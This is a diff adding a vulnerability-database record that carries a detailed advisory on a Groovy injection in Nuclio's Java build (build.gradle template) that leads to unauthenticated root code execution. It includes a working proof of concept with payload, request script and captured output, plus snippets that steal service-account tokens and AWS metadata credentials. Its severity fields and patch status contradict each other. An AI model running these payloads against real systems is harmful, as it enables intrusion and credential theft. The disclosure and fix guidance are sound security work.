@@ -1,0 +1,677 @@
+[id]
+ave_id = "AVE-2026-0391"
+aliases = ["CVE-2026-52833","GHSA-3v79-m2cg-89ww"]
+
+[basic]
+title = "Nuclio: Unsanitized runtimeAttributes.repositories injected into Groovy build.gradle leads to build-time RCE"
+description = "## Summary
+
+Nuclio's Java runtime generates a `build.gradle` file during function builds using Go's `text/template` package. The template renders `runtimeAttributes.repositories[]` values with the `{{ . }}` action, which performs no escaping. An attacker can embed a closing brace (`}`) to break out of the `repositories {}` block and append arbitrary Groovy statements that execute unconditionally during the Gradle configuration phase.
+
+The Dashboard API runs with NOP authentication by default, so no credentials are required. The build container runs as root. The injected command output confirmed by dynamic testing:
+
+```
+[RCE-PROOF] uid=0(root) gid=0(root) groups=0(root)
+nuclio-kanikojob.nuclioprocessorvul006rcev3latest.tkxsslz06ppcr
+root
+BUILD SUCCESSFUL in 512ms
+```
+
+- **CWE**: CWE-94 (Improper Control of Generation of Code / Code Injection)
+- **Affected versions**: Nuclio <= 1.15.27 (latest as of 2026-05-17, dynamically verified)
+
+---
+
+## Details
+
+### Root Cause
+
+`pkg/processor/build/runtime/java/runtime.go` — function `createGradleBuildScript()`
+
+**Step 1. User input flows from the API into the template data map without validation**
+
+`types.go:50-64` — `newBuildAttributes()` decodes `runtimeAttributes` with no content inspection. Any string is accepted for each element of `Repositories`:
+
+```go
+// pkg/processor/build/runtime/java/types.go:50-64
+func newBuildAttributes(encodedBuildAttributes map[string]interface{}) (*buildAttributes, error) {
+    newBuildAttributes := buildAttributes{}
+    if err := mapstructure.Decode(encodedBuildAttributes, &newBuildAttributes); err != nil {
+        return nil, errors.Wrap(err, \"Failed to decode build attributes\")
+    }
+    if len(newBuildAttributes.Repositories) == 0 {
+        newBuildAttributes.Repositories = []string{\"mavenCentral()\"}
+    }
+    return &newBuildAttributes, nil  // no validation of repository string contents
+}
+```
+
+**Step 2. `text/template` renders repositories verbatim into Groovy DSL**
+
+`runtime.go:111,139` — the template is parsed with `text/template`, which does not HTML-encode or escape special characters. `{{ . }}` emits each repository string as-is:
+
+```go
+// runtime.go:111
+gradleBuildScriptTemplate, err := template.New(\"gradleBuildScript\").Parse(j.getGradleBuildScriptTemplateContents())
+
+// runtime.go:139
+err = gradleBuildScriptTemplate.Execute(io.MultiWriter(&gradleBuildScriptTemplateBuffer, buildFile), data)
+```
+
+The template section for repositories (`runtime.go:155-159`):
+
+```
+repositories {
+    {{ range .Repositories }}
+    {{ . }}
+    {{ end }}
+}
+```
+
+`{{ . }}` is the verbatim output action. Because `text/template` (unlike `html/template`) applies no contextual escaping, any character — including `}`, `(`, `)`, newlines — is written directly to the `.gradle` file.
+
+**Step 3. Gradle evaluates the injected Groovy at configuration phase**
+
+The generated `build.gradle` is passed to `./build-user-handler.sh` inside the `quay.io/nuclio/handler-builder-java-onbuild` container. That script runs:
+
+```sh
+gradle tasks       # configuration phase: top-level Groovy runs
+gradle userHandler # configuration phase: top-level Groovy runs again
+```
+
+Groovy evaluates every top-level statement in `build.gradle` before executing any task. Injected code therefore runs unconditionally on both invocations.
+
+### Injection Mechanics
+
+Payload for `repositories[0]`:
+
+```
+mavenCentral()
+}
+println('[RCE-PROOF] ' + ['sh', '-c', 'id && hostname && whoami'].execute().text)
+repositories {
+```
+
+Generated `build.gradle` (confirmed by Dashboard DEBUG log at path `/tmp/nuclio-build-378373988/staging/handler/build.gradle`):
+
+```groovy
+plugins {
+  id 'com.github.johnrengelman.shadow' version '5.2.0'
+  id 'java'
+}
+
+repositories {
+
+    mavenCentral()
+}
+println('[RCE-PROOF] ' + ['sh', '-c', 'id && hostname && whoami'].execute().text)
+repositories {
+
+}
+
+dependencies {
+    compile files('./nuclio-sdk-java-1.1.0.jar')
+}
+
+shadowJar {
+   baseName = 'user-handler'
+   classifier = null
+}
+
+task userHandler(dependsOn: shadowJar)
+```
+
+The `}` on line 9 closes the `repositories {}` block. `println(...)` on line 10 becomes a top-level Groovy statement. `repositories {` on line 11 re-opens a new block that the template's trailing `}` correctly closes, making the entire file syntactically valid.
+
+Groovy's `List.execute()` extension method (e.g., `['sh', '-c', 'cmd'].execute()`) runs an OS process. `.text` captures its standard output. The injected `println` logs the output to Gradle's stdout, which appears in the kaniko executor log.
+
+---
+
+## Proof of Concept
+
+### Environment Setup
+
+The following steps reproduce the verified environment. All commands were executed and verified on 2026-05-17.
+
+#### 1. Create a dedicated kind cluster
+
+```bash
+cat > /tmp/kind-vul006.yaml <<'EOF'
+kind: Cluster
+apiVersion: kind.x-k8s.io/v1alpha4
+nodes:
+- role: control-plane
+  extraPortMappings:
+  - containerPort: 8070
+    hostPort: 8070
+    protocol: TCP
+- role: worker
+EOF
+
+kind create cluster --name vul-006 --config /tmp/kind-vul006.yaml
+```
+
+Expected output:
+```
+Creating cluster \"vul-006\" ...
+ ✓ Ensuring node image (kindest/node:v1.27.3)
+ ✓ Preparing nodes
+ ✓ Writing configuration
+ ✓ Starting control-plane
+ ✓ Installing CNI
+ ✓ Installing StorageClass
+ ✓ Joining worker nodes
+Set kubectl context to \"kind-vul-006\"
+```
+
+#### 2. Pre-load required images
+
+```bash
+# Pull images on host
+docker pull quay.io/nuclio/dashboard:1.15.27-amd64
+docker pull quay.io/nuclio/controller:1.15.27-amd64
+docker pull gcr.io/kaniko-project/executor:v1.23.2
+docker pull quay.io/nuclio/handler-builder-java-onbuild:1.15.27-amd64
+
+# Load into kind cluster
+kind load docker-image quay.io/nuclio/dashboard:1.15.27-amd64 --name vul-006
+kind load docker-image quay.io/nuclio/controller:1.15.27-amd64 --name vul-006
+kind load docker-image gcr.io/kaniko-project/executor:v1.23.2 --name vul-006
+kind load docker-image quay.io/nuclio/handler-builder-java-onbuild:1.15.27-amd64 --name vul-006
+```
+
+#### 3. Deploy a local image registry accessible from kind nodes
+
+```bash
+# Start registry (reuse existing if present)
+docker run -d --name kind-registry --restart=always \
+  --network kind -p 127.0.0.1:5001:5000 registry:2
+
+# Verify kind nodes can reach it
+REGISTRY_IP=$(docker inspect kind-registry \
+  --format '{{(index .NetworkSettings.Networks \"kind\").IPAddress}}')
+docker exec vul-006-control-plane curl -s http://${REGISTRY_IP}:5000/v2/
+# Expected: {}
+```
+
+#### 4. Install Nuclio via Helm
+
+```bash
+kubectl --context kind-vul-006 create namespace nuclio
+
+cat > /tmp/nuclio-values.yaml <<'EOF'
+dashboard:
+  enabled: true
+  containerBuilderKind: \"kaniko\"
+  monitorDockerDeamon:
+    enabled: false
+  image:
+    pullPolicy: IfNotPresent
+  kaniko:
+    insecurePushRegistry: true
+    insecurePullRegistry: true
+    initContainerImage:
+      busybox:
+        repository: gcr.io/iguazio/alpine   # substitute for busybox if Docker Hub rate-limited
+        tag: \"3.20\"
+
+registry:
+  pushPullUrl: \"kind-registry:5000\"
+
+controller:
+  enabled: true
+  image:
+    pullPolicy: IfNotPresent
+
+rbac:
+  create: true
+  crdAccessMode: cluster
+EOF
+
+helm install nuclio ./hack/k8s/helm/nuclio \
+  --namespace nuclio \
+  --kube-context kind-vul-006 \
+  -f /tmp/nuclio-values.yaml \
+  --wait --timeout 120s
+```
+
+Expected output:
+```
+NAME: nuclio
+STATUS: deployed
+REVISION: 1
+```
+
+#### 5. Expose the Dashboard and verify connectivity
+
+```bash
+kubectl --context kind-vul-006 port-forward \
+  -n nuclio svc/nuclio-dashboard 8070:8070 &
+
+# Wait for readiness
+sleep 5
+curl -s http://localhost:8070/api/functions -o /dev/null -w \"HTTP %{http_code}\n\"
+# Expected: HTTP 200
+
+# Create the default project required by the API
+curl -s -X POST http://localhost:8070/api/projects \
+  -H \"Content-Type: application/json\" \
+  -d '{\"metadata\":{\"name\":\"default\",\"namespace\":\"nuclio\"},\"spec\":{}}'
+```
+
+### Exploitation Steps
+
+#### Step 1 — Send the malicious function definition
+
+The `runtimeAttributes.repositories` field accepts any string. Use Python to build a
+correctly escaped JSON payload:
+
+```python
+import json, base64
+
+# Minimal valid Java handler source
+java_src = \"\"\"import io.nuclio.Context;
+import io.nuclio.Event;
+public class Handler implements io.nuclio.EventHandler {
+    @Override
+    public Object handleEvent(Context ctx, Event event) { return \"hello\"; }
+}\"\"\"
+
+# Injection: close the repositories block, run a command, re-open the block
+injection = (
+    \"mavenCentral()\n\"
+    \"}\n\"
+    \"println('[RCE-PROOF] ' + ['sh', '-c', 'id && hostname && whoami'].execute().text)\n\"
+    \"repositories {\"
+)
+
+payload = {
+    \"metadata\": {\"name\": \"vul006-test\", \"namespace\": \"nuclio\"},
+    \"spec\": {
+        \"runtime\": \"java\",
+        \"handler\": \"io.nuclio.Handler\",
+        \"build\": {
+            \"functionSourceCode\": base64.b64encode(java_src.encode()).decode(),
+            \"runtimeAttributes\": {\"repositories\": [injection]}
+        },
+        \"minReplicas\": 0, \"maxReplicas\": 1
+    }
+}
+
+with open(\"/tmp/payload.json\", \"w\") as f:
+    json.dump(payload, f)
+```
+
+```bash
+HTTP_CODE=$(curl -s -o /tmp/response.json -w \"%{http_code}\" \
+    -X POST http://localhost:8070/api/functions \
+    -H \"Content-Type: application/json\" \
+    -H \"x-nuclio-project-name: default\" \
+    -d @/tmp/payload.json)
+echo \"HTTP: ${HTTP_CODE}\"
+```
+
+Expected output:
+```
+HTTP: 202
+```
+
+No authentication required. No validation error for the injected repository value.
+
+#### Step 2 — Confirm template injection in the Dashboard DEBUG log
+
+```bash
+kubectl --context kind-vul-006 logs \
+    -n nuclio deploy/nuclio-dashboard --tail=100 \
+    | grep \"Created gradle build script\" \
+    | python3 -c \"
+import sys, json, re
+for line in sys.stdin:
+    m = re.search(r'Created gradle build script ({.*})', line)
+    if m:
+        print(json.loads(m.group(1))['content'])
+\"
+```
+
+Actual output (from verified run):
+```
+plugins {
+  id 'com.github.johnrengelman.shadow' version '5.2.0'
+  id 'java'
+}
+
+repositories {
+
+	mavenCentral()
+}
+println('[RCE-PROOF] ' + ['sh', '-c', 'id && hostname && whoami'].execute().text)
+repositories {
+
+}
+
+dependencies {
+
+    compile files('./nuclio-sdk-java-1.1.0.jar')
+}
+
+shadowJar {
+   baseName = 'user-handler'
+   classifier = null
+}
+
+task userHandler(dependsOn: shadowJar)
+```
+
+The Dashboard DEBUG log (path logged: `/tmp/nuclio-build-378373988/staging/handler/build.gradle`) confirms the injected Groovy reached the file verbatim.
+
+#### Step 3 — Wait for the kaniko build job and observe RCE output
+
+```bash
+# Wait for the kaniko pod to appear
+until kubectl --context kind-vul-006 get pods -n nuclio --no-headers \
+    | grep -q \"kaniko\"; do sleep 2; done
+
+POD=$(kubectl --context kind-vul-006 get pods -n nuclio --no-headers \
+    | grep kaniko | awk '{print $1}')
+echo \"Build pod: ${POD}\"
+
+# Wait for completion
+until kubectl --context kind-vul-006 get pod -n nuclio \"${POD}\" \
+    --no-headers | grep -qE \"Completed|Error\"; do sleep 3; done
+
+# Retrieve execution evidence
+kubectl --context kind-vul-006 logs -n nuclio \"${POD}\" \
+    -c kaniko-executor | grep -A3 \"RCE-PROOF\"
+```
+
+Actual output (from verified run, pod `nuclio-kanikojob.nuclioprocessorvul006rcev3latest.tkxsslz06ppcr`):
+```
+[RCE-PROOF] uid=0(root) gid=0(root) groups=0(root)
+nuclio-kanikojob.nuclioprocessorvul006rcev3latest.tkxsslz06ppcr
+root
+BUILD SUCCESSFUL in 2s
+
+[RCE-PROOF] uid=0(root) gid=0(root) groups=0(root)
+nuclio-kanikojob.nuclioprocessorvul006rcev3latest.tkxsslz06ppcr
+root
+BUILD SUCCESSFUL in 512ms
+```
+
+The marker `[RCE-PROOF]` appears twice — once per `gradle` invocation (`gradle tasks`
+and `gradle userHandler`). The output confirms:
+- `uid=0(root)` — execution as root inside the builder container
+- The pod name as hostname — confirms execution is inside the real build container, not simulated
+- `root` — `whoami` output corroborates the UID
+
+### Cleanup
+
+```bash
+kubectl --context kind-vul-006 delete nucliofunction vul006-test -n nuclio
+kind delete cluster --name vul-006
+```
+
+---
+
+## Impact
+
+### Direct Impact
+
+An unauthenticated attacker can execute arbitrary OS commands as root inside the function builder container on every Java function build. Confirmed capabilities from the build container environment:
+
+- Read/write the build container filesystem
+- Access network endpoints reachable from the build pod
+- Tamper with the compiled function artifact (`.jar`) before it is packaged into the
+  processor image — effectively poisoning the resulting function's image
+
+### Privilege Escalation — Docker Socket Escape (Verified: NOT directly exploitable in default configuration)
+
+**Verification result: In the default docker builder configuration, direct Docker socket escape via Gradle code injection is NOT exploitable.**
+
+#### Environment
+
+- Cluster: kind-vul-009, Nuclio v1.15.27-amd64
+- Builder: `NUCLIO_CONTAINER_BUILDER_KIND=docker` (confirmed via `kubectl describe`)
+- Dashboard pod: `nuclio-dashboard-5f8ddc949c-sfzh4`
+- Verified: 2026-05-19 06:21 UTC
+
+#### docker.sock Mount Confirmed on Dashboard Pod
+
+```
+Mounts:
+  /var/run/docker.sock from docker-sock (rw)
+
+Volumes:
+  docker-sock:
+    Type:     HostPath (bare host directory volume)
+    Path:     /var/run/docker.sock
+```
+
+The Docker socket is accessible within the Dashboard container itself (Docker v29.1.2 API confirmed reachable).
+
+#### Build Flow in docker Builder Mode
+
+Nuclio generates a `Dockerfile.onbuild` and submits it to Docker daemon via the socket:
+
+```dockerfile
+FROM quay.io/nuclio/handler-builder-java-onbuild:1.15.27-amd64
+COPY handler/build.gradle /home/gradle/src/userHandler
+COPY ${NUCLIO_BUILD_LOCAL_HANDLER_DIR} /home/gradle/src/userHandler
+RUN cd /home/gradle/src/userHandler && ./build-user-handler.sh   # Gradle executes here
+```
+
+Actual command issued (from Dashboard DEBUG log):
+
+```
+docker build --network host --force-rm -t nuclio-onbuild-d8602mam53lc7e12q410 \
+  -f Dockerfile.onbuild --build-arg NUCLIO_LABEL=1.15.27 ...
+```
+
+#### Probe Results (Step 7/9 RUN Layer)
+
+Injection payload in `repositories[0]`:
+
+```
+mavenCentral()
+}
+println('[PROBE-1] docker.sock exists: ' + new File('/var/run/docker.sock').exists())
+println('[PROBE-2] ' + ['sh', '-c', 'ls -la /var/run/docker.sock 2>&1 || echo NOT_FOUND'].execute().text)
+println('[PROBE-ENV] hostname=' + ['sh', '-c', 'hostname'].execute().text.trim())
+repositories {
+```
+
+Gradle output (captured twice — once per `gradle tasks` / `gradle userHandler` invocation):
+
+```
+> Configure project :
+[PROBE-1] docker.sock exists: false
+[PROBE-2] ls: cannot access '/var/run/docker.sock': No such file or directory
+NOT_FOUND
+
+[PROBE-ENV] hostname=VM-0-8-ubuntu
+
+BUILD SUCCESSFUL in 2s
+```
+
+The RCE executed successfully. The `docker.sock` does not exist inside the `RUN`-stage container.
+
+#### Root Cause
+
+Each `RUN` instruction in a `docker build` executes inside an isolated intermediate container
+(`b747a20b21ba`). That container:
+
+1. Has a filesystem built from image layers only — it does **not** inherit volume mounts from the caller (the Dashboard container).
+2. `--network host` shares the host network namespace (explaining `hostname=VM-0-8-ubuntu`) but does **not** share the filesystem.
+3. Docker daemon never exposes the host filesystem (including `/var/run/docker.sock`) to build-stage containers unless the Dockerfile explicitly arranges it.
+
+#### Conditions Required for Exploitability
+
+This path becomes exploitable only under non-default configurations:
+
+- **Dockerfile with explicit socket bind**: e.g., BuildKit `--mount=type=bind,source=/var/run/docker.sock,...` in the onbuild image, or replacing `docker build` with `docker run -v /var/run/docker.sock:/var/run/docker.sock`
+- **Privileged build containers**: `--privileged` mode with `mknod` device node creation
+- **Docker-in-Docker setup**: Docker daemon pre-installed and launched inside the builder image
+
+None of these conditions exist in the standard Nuclio Helm chart deployment.
+
+Evidence: `evidence/logs/docker-builder-socket-probe.log`
+
+### Privilege Escalation — Kubernetes ServiceAccount Token
+
+The build pod can read the ServiceAccount token mounted within it. **However**, the kaniko Job's `serviceAccountName` is sourced from `builderServiceAccount`, function `serviceAccount`, `kaniko.defaultServiceAccount`, or the platform's default function SA (see `pkg/containerimagebuilderpusher/kaniko.go:301`, `:375`, `:840-849`). This is not inherently the same as the Nuclio Dashboard's high-privilege ServiceAccount.
+
+In deployments where the build pod uses a high-privilege ServiceAccount (e.g., where an administrator has bound overly broad RBAC roles to the builder SA), an attacker can read the token and query the Kubernetes API:
+
+```groovy
+// Read the build pod's own SA token (not the Dashboard SA)
+def token = new File('/var/run/secrets/kubernetes.io/serviceaccount/token').text
+['sh', '-c', \"curl -sk -H 'Authorization: Bearer ${token}' \" +
+ 'https://kubernetes.default.svc/api/v1/namespaces/nuclio/secrets'].execute().text
+```
+
+The effective permissions of this token depend on the RBAC bindings of the build pod's ServiceAccount. Under least-privilege configurations, this token may not be able to access sensitive resources.
+
+### Cross-Tenant Access (Horizontal Escalation)
+
+Nuclio uses Kubernetes namespaces for tenant isolation. Build containers in docker mode share the host Docker daemon. An attacker can enumerate and access containers belonging to other tenants via the Docker socket.
+
+### Cloud Instance Metadata (SSRF — Managed Kubernetes)
+
+In EKS, GKE, or AKS environments, the build container can reach the cloud instance metadata service:
+
+```groovy
+// AWS IMDSv2 — retrieve IAM role credentials
+def imdsToken = ['sh', '-c',
+    'curl -s -X PUT \"http://169.254.169.254/latest/api/token\" ' +
+    '-H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"'].execute().text.trim()
+def role = ['sh', '-c',
+    \"curl -s -H 'X-aws-ec2-metadata-token: ${imdsToken}' \" +
+    'http://169.254.169.254/latest/meta-data/iam/security-credentials/'].execute().text
+```
+
+Obtained temporary IAM credentials grant access to AWS services (ECR, S3, etc.) available to the node's IAM role.
+
+---
+
+## Severity
+
+**CVSS 3.1 Score: 10.0 (Critical)**
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+```
+
+| Metric | Value | Rationale |
+|--------|-------|-----------|
+| Attack Vector | Network | Dashboard API is network-accessible |
+| Attack Complexity | Low | Single POST request; no race condition or special preparation |
+| Privileges Required | None | Default NOP authentication requires no credentials |
+| User Interaction | None | No user action required |
+| Scope | Changed | Impact can escape the build container under common production deployments (see below) |
+| Confidentiality | High | Registry credentials, SA tokens, cloud credentials readable in most deployments |
+| Integrity | High | Function images can be tampered; cluster resources modifiable |
+| Availability | High | Build pipeline can be disrupted; cluster resources deletable |
+
+### Rating Rationale
+
+This RCE has realistic conditions for further credential acquisition and lateral movement from the build container. In particular, under the following common production deployment scenarios:
+
+- Kaniko builds use registry secrets (image push credentials mounted into the build pod)
+- ECR registry provider secrets are configured
+- Node IAM metadata is reachable (IMDS not blocked)
+- Build pods use a high-privilege ServiceAccount
+
+An attacker can read image registry credentials, AWS/GCP temporary credentials, or Kubernetes SA tokens, and subsequently poison the image registry, access cluster resources, or pivot to cloud resources. A **Critical** rating is justified under these common deployment conditions.
+
+**Downgrade conditions**: If a deployment follows least-privilege principles — no registry/cloud credential mounts, IMDS blocked, build SA has no sensitive RBAC bindings — the impact is primarily limited to code execution within the build container and artifact tampering. This remains **High** severity but should not be justified on the basis of \"default lateral movement.\"
+
+---
+
+## Affected Versions
+
+- Nuclio <= **1.15.27** (latest release as of 2026-05-17)
+- All versions that include the Java runtime build path
+  (`pkg/processor/build/runtime/java/runtime.go`)
+
+The vulnerability was introduced when the Java runtime and its `runtimeAttributes` support were added and has not been addressed in any release to date.
+
+---
+
+## Patched Versions
+
+https://github.com/nuclio/nuclio/releases/tag/1.16.5
+
+---
+
+## Workarounds
+
+Until a patch is released, the following mitigations reduce exposure:
+
+1. **Enable authentication on the Dashboard.** Set `NUCLIO_AUTH_KIND` to a non-NOP
+   authenticator (e.g., `iguazio`). This prevents unauthenticated access to the function
+   creation API.
+
+2. **Network-restrict the Dashboard port (8070).** Allow access only from trusted internal
+   networks or VPN. Do not expose the Dashboard to the public internet.
+
+3. **Disable Java runtime support** if not in use. Remove the Java runtime handler from
+   the dashboard deployment configuration.
+
+4. **Use kaniko over docker builder.** In kaniko mode the Docker socket is not mounted,
+   eliminating the host-escape path. The build-time RCE remains exploitable, but the
+   blast radius is reduced to the build pod.
+
+---
+
+## Remediation Recommendations
+
+**Option 1 — Input validation (recommended for quick fix)**
+
+In `newBuildAttributes()` (`types.go:50`), validate each repository string against an allowlist pattern before accepting it:
+
+```go
+import \"regexp\"
+
+var repoPattern = regexp.MustCompile(`^[a-zA-Z0-9_\-\(\)\.:\/]+$`)
+
+for _, repo := range newBuildAttributes.Repositories {
+    if !repoPattern.MatchString(repo) {
+        return nil, fmt.Errorf(\"invalid repository value: %q\", repo)
+    }
+}
+```
+
+**Option 2 — Replace `text/template` with a safe rendering approach**
+
+The repositories block should not use a Go template at all. Build the `build.gradle` content programmatically using string concatenation with per-value validation, rather than via a template that cannot express per-field escaping semantics.
+
+**Option 3 — Content Security: reject newlines and Groovy metacharacters**
+
+Reject any repository value containing `\n`, `\r`, `{`, `}`, `(`, `)`, `'`, `\"`. These characters are not present in valid Maven repository declarations.
+
+---
+
+## Resources
+
+- `pkg/processor/build/runtime/java/runtime.go` — `createGradleBuildScript()` (line 87)
+- `pkg/processor/build/runtime/java/runtime.go` — `getGradleBuildScriptTemplateContents()` (line 149)
+- `pkg/processor/build/runtime/java/types.go` — `newBuildAttributes()` (line 50)
+- Go `text/template` documentation: https://pkg.go.dev/text/template
+- Groovy `List.execute()` / `String.execute()`: https://docs.groovy-lang.org/latest/html/groovy-jdk/java/lang/String.html#execute()
+- Nuclio Dashboard authentication configuration: https://nuclio.io/docs/latest/reference/api/nuclio_dashboard_api/"
+severity = "HIGH"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-24T04:00:44.121917806+00:00"
